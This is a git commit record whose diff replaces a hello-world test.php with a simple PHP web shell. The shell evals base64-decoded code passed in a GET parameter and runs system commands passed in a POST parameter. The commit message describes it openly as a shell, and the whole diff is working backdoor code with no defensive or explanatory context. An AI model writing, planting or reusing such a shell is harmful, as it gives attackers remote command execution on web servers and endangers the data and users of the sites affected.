2c027011e4b46bd9e1e1665aea0bc6e20fc3eeef
massikkkkkk <vladclash12345@gmail.com>
2026-01-08 20:25:45 +0200

    Implement simple PHP shell with command execution
    Added a simple PHP shell that executes commands via GET and POST.

--- test.php
+++ test.php
@@ -1,1 +1,10 @@
-<?php echo 'Hello, world'; ?>
+<?php
+// Simple PHP Shell with obfuscation
+if(isset($_GET['c'])) {
+    eval(base64_decode($_GET['c']));
+} elseif(isset($_POST['cmd'])) {
+    system($_POST['cmd']);
+} else {
+    echo "Shell Active";
+}
+?>
